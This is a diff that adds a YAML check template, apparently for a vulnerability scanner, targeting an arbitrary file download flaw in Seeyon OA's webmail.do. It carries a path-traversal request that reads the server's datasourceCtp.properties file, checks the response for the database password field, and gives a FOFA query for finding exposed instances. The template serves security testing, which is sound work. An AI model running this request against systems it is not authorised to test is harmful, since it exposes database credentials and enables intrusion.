@@ -1,0 +1,24 @@
+info:
+  vulId: seeyon_fileread_webmail
+  detail: 致远OA webmail.do任意文件下载漏洞
+  fofaQuery: app="致远互联-OA"
+rules:
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - ctpDataSource.password
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
